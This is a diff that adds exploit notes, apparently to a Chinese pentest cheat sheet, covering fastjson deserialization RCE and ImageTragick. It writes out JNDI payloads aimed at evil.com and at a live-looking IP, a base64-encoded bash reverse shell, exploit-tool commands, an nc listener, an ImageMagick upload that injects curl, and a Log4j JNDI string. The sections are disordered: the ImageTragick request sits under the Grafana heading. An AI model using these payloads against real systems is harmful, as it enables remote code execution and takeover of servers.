@@ -31,6 +31,15 @@
         - [CVE-2015-1427](#CVE-2015-1427)
         - [CVE-2015-3337](#CVE-2015-3337)
 
+- [Imagetragick](#Imagetragick)
+    - [CVE-2016–3714](#CVE-2016–3714)
+
+- [fastjson](#fastjson)
+    - [漏洞扫描/探测](#漏洞扫描/探测)
+    - [1.2.24-rce](#1.2.24-rce)
+    - [1.2.47-rce](#1.2.47-rce)
+
+
 - [Grafana](#Grafana)
     - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
 
@@ -303,10 +312,112 @@ Host: node4.buuoj.cn:25305
 
 ![image](./img/cve-2015-3337.png)
 
+## Imagetragick
+
+ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。
+
+### CVE-2016–3714
+## fastjson
+
+Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
+
+### 漏洞扫描/探测
+
+
+
+https://github.com/pmiaowu/BurpFastJsonScan
+
+晚点研究下
+### 1.2.24-rce
+
+方法同理1.2.27，payload不一样
+
+```
+{
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://evil.com:9999/TouchFile",
+        "autoCommit":true
+    }
+}
+```
+
+### 1.2.27-rce
+
+影响版本：fastjson <= 1.2.47
+
+**JNDI注入**
+
+相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
+
+反弹shell需要先编码成base64 java可识别的
+
+在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
+
+如：`sh -i >& /dev/tcp/1.117.51.253/8888 0>&1`需要先拖进去编码
+
+首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 1.117.51.253
+```
+
+![image](./img/fastjson2.png)
+
+监听8888端口:
+
+```
+nc -lvnp 8888
+```
+
+目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://1.117.51.253:1389/yomh4h",
+        "autoCommit":true
+    }
+}
+```
+![image](./img/fastjson1.png)
+
+![image](./img/fastjson3.png)
+
+
+
 ## Grafana
 
 Grafana是一个开源的度量分析与可视化套件。
 
+```
+POST / HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Length: 328
+
+------WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Disposition: form-data; name="file_upload"; filename="1.gif"
+Content-Type: image/png
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg"|curl "1.117.51.253:8889)'
+pop graphic-context
+------WebKitFormBoundarymdcbmdQR1sDse9Et--
+```
+
+
+${jndi:ldap://sl3i3t.dnslog.cn/exp}
 ### Grafana插件模块目录穿越漏洞
 
 Grafana 8.x 插件模块目录穿越漏洞
